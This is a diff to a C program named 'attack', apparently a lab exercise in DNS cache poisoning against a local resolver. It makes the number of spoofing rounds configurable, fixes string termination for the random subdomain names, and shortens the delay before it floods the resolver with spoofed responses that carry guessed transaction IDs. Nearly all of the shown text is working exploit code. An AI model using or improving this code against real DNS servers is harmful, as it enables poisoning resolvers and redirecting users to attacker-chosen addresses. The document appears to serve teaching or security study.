@@ -37,8 +37,17 @@ void send_raw_packet(char * buffer, int pkt_size);
 void send_dns_request(char* name, unsigned char* ip_req, int n_req);
 void send_dns_response(char* name, unsigned char* ip_resp, int n_resp, unsigned short id);
 
-int main()
+int main(int argc, char **argv)
 {
+  if (argc != 2)
+  {
+    printf("Usage: ./attack <num_query_spoofing\n");
+    return -1;
+  }
+
+  // Times to loop
+  int times = atoi(argv[1]);
+
   srand(time(NULL));
 
   // Load the DNS request packet from file
@@ -61,25 +70,25 @@ int main()
 
   char a[26]="abcdefghijklmnopqrstuvwxyz";
   
-  // Times to loop
-  int times = 100;
   int i = 0;
   
   while (i < times) {
     unsigned short transaction_id = 1000;
   
     // Generate a random name with length HOSTNAME_QUERY_LENGTH = 5
-    char name[HOSTNAME_QUERY_LENGTH];
-    for (int k=0; k < HOSTNAME_QUERY_LENGTH; k++)  name[k] = a[rand() % 26];
-      
-    printf("Request #%d is [%s.example.com], transaction ID is: [%hu]\n", i++, name, transaction_id); 
+    char name[HOSTNAME_QUERY_LENGTH + 1];
+    for (int k=0; k < HOSTNAME_QUERY_LENGTH; k++)  
+      name[k] = a[rand() % 26];
+    name[HOSTNAME_QUERY_LENGTH] = '\0';  
+
+    printf("Request #%d is [%s.example.com], begin with transaction ID is: [%hu]\n", i++, name, transaction_id); 
     
     
     /* Step 1. Send a DNS request to the targeted local DNS server.
                This will trigger the DNS server to send out DNS queries */
     send_dns_request(name, ip_req, n_req);
     
-    sleep(0.65);
+    sleep(0.10);
     
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
